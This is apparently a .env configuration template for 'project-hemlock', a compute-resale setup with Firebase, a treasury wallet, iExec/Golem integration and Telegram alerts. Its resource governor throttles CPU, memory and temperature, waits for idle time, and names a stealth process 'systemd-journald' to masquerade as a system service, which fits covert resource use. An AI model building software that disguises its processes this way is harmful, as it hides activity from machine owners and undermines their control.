# FIREBASE CONFIGURATION (MUST BE SETUP FIRST)
FIREBASE_PROJECT_ID=project-hemlock
FIREBASE_DATABASE_URL=https://project-hemlock.firebaseio.com
FIREBASE_SERVICE_ACCOUNT_PATH=/path/to/serviceAccountKey.json
FIREBASE_COLLECTION_PREFIX=hemlock_

# TREASURY & WALLET CONFIGURATION
TREASURY_WALLET_ADDRESS=0x...
TREASURY_WALLET_PRIVATE_KEY=encrypted_key_here
TREASURY_MULTISIG_THRESHOLD=2
TREASURY_AUTO_SWAP_THRESHOLD=100  # USD

# RESOURCE GOVERNOR SETTINGS
MAX_CPU_PERCENT=70
MAX_MEMORY_PERCENT=60
MAX_TEMPERATURE_C=85
IDLE_THRESHOLD_SECONDS=300
STEALTH_PROCESS_NAME="systemd-journald"  # Common system process to masquerade as

# PLATFORM INTEGRATIONS
IEXEC_API_KEY=your_iexec_key
IEXEC_API_SECRET=your_iexec_secret
GOLEM_NETWORK=testnet
GOLEM_PAYMENT_DRIVER=zksync

# MONITORING & ALERTING
TELEGRAM_BOT_TOKEN=your_telegram_bot_token
TELEGRAM_CHAT_ID=your_chat_id
LOG_LEVEL=INFO
HEARTBEAT_INTERVAL_SECONDS=60

# SAFETY & LIMITS
DAILY_LOSS_LIMIT_USD=5.0
MAX_CONCURRENT_TASKS=3
PLATFORM_BLACKLIST_TIMEOUT_HOURS=24